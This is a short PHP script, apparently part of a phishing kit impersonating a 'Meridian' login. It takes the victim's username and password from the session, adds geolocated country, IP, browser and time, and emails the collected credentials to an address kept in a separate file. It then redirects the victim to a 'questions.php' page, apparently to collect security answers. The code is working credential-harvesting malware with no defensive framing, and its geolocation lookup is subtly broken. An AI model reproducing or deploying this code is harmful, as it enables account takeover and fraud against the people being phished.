<?php
	session_start();
    include 'email.php';
	
	
    $ip = getenv("REMOTE_ADDR");
    $u = "http://www.geoiptool.com/?IP='$ip'";
    $dump = unserialize(file_get_contents($u));
    $country = $dump["geoplugin_countryName"];
	$user = $_SESSION['username'];
	$pass =$_SESSION['password'];
	$time= $_InfoDATE   = date("d-m-Y h:i:sa");
	$browser= $_SERVER['HTTP_USER_AGENT'];
    $subject = 'MERI Account [ '.$country.' - '.$_SERVER['REMOTE_ADDR'].' ]';
    $data=" |============ Meridian Login ===========|
        User: $user
        Pass: $pass
        
        time: $time
        Browser: $browser
        IP:$ip
    ";
         


	if(strlen($user) <= 16 && strlen($user) >=5 ){
	mail($to, $subject, $data);
	}
    
 ?>
 <script>
    window.top.location.href = "questions.php";

</script>